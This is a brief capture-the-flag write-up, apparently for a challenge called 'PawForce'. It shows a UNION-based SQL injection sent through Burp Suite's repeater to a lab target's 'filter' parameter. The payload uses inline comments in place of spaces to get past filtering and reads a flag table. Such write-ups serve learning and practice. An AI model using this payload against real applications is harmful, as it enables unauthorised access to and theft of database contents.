PawForce

IP given: 94.237.61.187:58237

First thing I did was open firefox and entered it into the search bar.

<img width="468" height="284" alt="image" src="https://github.com/user-attachments/assets/5896fdcd-9ef9-4fc8-9670-766d86c8ae27" />

I opened Burp suite and started a proxy. With the browser open I entered my target ip address and made sure intercept was on. This is to see what kind of traffic and information I can observe.

I sent the request with /?filter=Heroes to the repeater.

<img width="468" height="292" alt="image" src="https://github.com/user-attachments/assets/ed6d3da9-c678-4fd7-93ce-90b6e19f9c0c" />

I used SQL command to get the flag. I changed the filter with Heroes'/**/UNION/**/SELECT/**/0,flag,'','',''/**/FROM/**/flag—

This command is essentially the same thing as:
SELECT * FROM products WHERE category = 'Heroes'
UNION SELECT 0, flag, '', '', '' FROM flag --

<img width="1744" height="1058" alt="image" src="https://github.com/user-attachments/assets/0e246783-6284-4624-86aa-d6dce4f503be" />

There the flag is revealed
